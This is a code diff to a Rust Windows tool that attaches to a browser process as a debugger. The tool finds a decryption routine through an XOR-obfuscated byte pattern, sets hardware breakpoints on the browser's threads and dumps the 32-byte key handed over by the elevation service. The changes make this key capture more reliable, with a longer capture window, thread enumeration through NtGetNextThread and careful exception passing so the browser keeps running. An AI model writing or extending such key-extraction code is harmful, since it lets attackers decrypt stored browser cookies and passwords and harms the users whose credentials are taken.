@@ -1,7 +1,11 @@
-use std::mem::zeroed;
+use std::mem::{transmute, zeroed};
+use std::sync::OnceLock;
+use std::time::{Duration, Instant};
 
+use windows::core::{s, w};
 use windows::Win32::Foundation::{
-    CloseHandle, DBG_CONTINUE, EXCEPTION_SINGLE_STEP, HANDLE,
+    CloseHandle, DBG_CONTINUE, DBG_EXCEPTION_NOT_HANDLED, EXCEPTION_BREAKPOINT,
+    EXCEPTION_SINGLE_STEP, HANDLE,
 };
 use windows::Win32::System::Diagnostics::Debug::{
     ContinueDebugEvent, GetThreadContext, SetThreadContext, WaitForDebugEvent, CONTEXT,
@@ -9,11 +13,11 @@ use windows::Win32::System::Diagnostics::Debug::{
     CREATE_THREAD_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXIT_PROCESS_DEBUG_EVENT,
     LOAD_DLL_DEBUG_EVENT, LOAD_DLL_DEBUG_INFO,
 };
+use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
 use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};
 
 use crate::mem;
 use crate::pe;
-use crate::process;
 
 const ANCHOR_KEY: u8 = 0x5A;
 const ANCHOR_ENC: [u8; 44] = [
@@ -37,7 +41,55 @@ fn decrypt_anchor() -> Vec<u8> {
     ANCHOR_ENC.iter().map(|b| b ^ key).collect()
 }
 const KEY_LEN: usize = 32;
-const DEBUG_EVENT_WAIT_MS: u32 = 500;
+
+/// Total time the debug loop may run. Startup can block for seconds at a time
+/// without producing any debug event (notably the COM round trip into the
+/// elevation service that hands over the wrapped key), so a short per-event
+/// wait would abandon the capture right before the decryption happens. A
+/// generous window with a hard deadline keeps us listening until the hit.
+const CAPTURE_WINDOW: Duration = Duration::from_secs(20);
+
+/// Walk the debuggee's threads like the original tool's default path
+/// (NtGetNextThread). A toolhelp thread snapshot enumerates every thread in
+/// the system and can deadlock while the debuggee is frozen mid-load.
+type NtGetNextThreadFn =
+    unsafe extern "system" fn(HANDLE, HANDLE, u32, u32, u32, *mut HANDLE) -> i32;
+
+fn nt_get_next_thread() -> Option<NtGetNextThreadFn> {
+    static FN: OnceLock<Option<NtGetNextThreadFn>> = OnceLock::new();
+    *FN.get_or_init(|| unsafe {
+        let ntdll = GetModuleHandleW(w!("ntdll.dll")).ok()?;
+        let address = GetProcAddress(ntdll, s!("NtGetNextThread"))?;
+        Some(transmute(address))
+    })
+}
+
+/// Returns the number of threads the breakpoint was actually set on.
+fn arm_on_debuggee_threads(hprocess: HANDLE, addr: usize, clear: bool) -> usize {
+    let Some(get_next_thread) = nt_get_next_thread() else {
+        eprintln!("[-] NtGetNextThread is unavailable; cannot arm breakpoints");
+        return 0;
+    };
+    let mut armed = 0;
+    let mut previous = HANDLE::default();
+    loop {
+        let mut next = HANDLE::default();
+        let status = unsafe {
+            get_next_thread(hprocess, previous, THREAD_ALL_ACCESS.0, 0, 0, &mut next)
+        };
+        if !previous.is_invalid() {
+            unsafe { let _ = CloseHandle(previous); };
+        }
+        if status != 0 {
+            break;
+        }
+        if arm_thread(next, addr, clear) {
+            armed += 1;
+        }
+        previous = next;
+    }
+    armed
+}
 
 /// On x64, Get/SetThreadContext require the CONTEXT buffer to be 16-byte
 /// aligned (the C header uses __declspec(align(16)), which the windows crate
@@ -79,20 +131,6 @@ fn arm_thread(hthread: HANDLE, addr: usize, clear: bool) -> bool {
     }
     let armed = set_hw_breakpoint(hthread, addr, clear);
     unsafe { ResumeThread(hthread) };
-    armed
-}
-
-/// Returns the number of threads the breakpoint was actually set on.
-fn arm_all_threads(pid: u32, addr: usize, clear: bool) -> usize {
-    let mut armed = 0;
-    for tid in process::threads_of(pid) {
-        if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
-            if arm_thread(hthread, addr, clear) {
-                armed += 1;
-            }
-            unsafe { let _ = CloseHandle(hthread); };
-        }
-    }
     armed
 }
 
@@ -159,14 +197,19 @@ fn locate_breakpoint(hprocess: HANDLE, base: usize) -> Option<usize> {
 pub fn run(hprocess: HANDLE, pid: u32, target_module: &str, edge: bool) -> Option<[u8; KEY_LEN]> {
     let mut breakpoint: Option<usize> = None;
     let mut event: DEBUG_EVENT = unsafe { zeroed() };
+    let deadline = Instant::now() + CAPTURE_WINDOW;
 
     loop {
-        if unsafe { WaitForDebugEvent(&mut event, DEBUG_EVENT_WAIT_MS) }.is_err() {
-            // The debuggee went quiet: startup finished without a hit.
+        let remaining_ms = deadline
+            .saturating_duration_since(Instant::now())
+            .as_millis() as u32;
+        if remaining_ms == 0 || unsafe { WaitForDebugEvent(&mut event, remaining_ms) }.is_err() {
+            // Out of time, or the debuggee went quiet: no capture this run.
             if let Some(bp) = breakpoint {
                 // Detaching with breakpoints still armed would crash it.
-                arm_all_threads(pid, bp, true);
+                arm_on_debuggee_threads(hprocess, bp, true);
             }
+            eprintln!("[-] The debug loop ended without a breakpoint hit");
             break;
         }
 
@@ -182,10 +225,21 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str, edge: bool) -> Optio
                 if ev_pid == pid && code == EXCEPTION_SINGLE_STEP && breakpoint.is_some() {
                     let bp = breakpoint?;
                     let key = dump_key(hprocess, tid, edge);
-                    arm_all_threads(pid, bp, true); // clear hardware breakpoints
+                    arm_on_debuggee_threads(hprocess, bp, true); // clear hardware breakpoints
                     unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                     return key;
                 }
+                // Never claim we handled the target's own exceptions: browser
+                // components (trap handlers, sandbox, SEH) rely on their own
+                // first-chance exception dispatch. Only consume debugger
+                // breakpoints from the initial attach / new processes.
+                let status = if code == EXCEPTION_BREAKPOINT && info.dwFirstChance != 0 {
+                    DBG_CONTINUE
+                } else {
+                    DBG_EXCEPTION_NOT_HANDLED
+                };
+                unsafe { let _ = ContinueDebugEvent(ev_pid, tid, status); };
+                continue;
             }
             CREATE_THREAD_DEBUG_EVENT => {
                 if breakpoint.is_some() && ev_pid == pid {
@@ -204,11 +258,8 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str, edge: bool) -> Optio
                             println!("[*] {target_module} loaded at {base:#x}");
                             match locate_breakpoint(hprocess, base) {
                                 Some(bp) => {
-                                    let total = process::threads_of(pid).len();
-                                    let armed = arm_all_threads(pid, bp, false);
-                                    println!(
-                                        "[*] Hardware breakpoint armed on {armed}/{total} threads"
-                                    );
+                                    let armed = arm_on_debuggee_threads(hprocess, bp, false);
+                                    println!("[*] Hardware breakpoint armed on {armed} threads");
                                     breakpoint = Some(bp);
                                 }
                                 None => eprintln!(
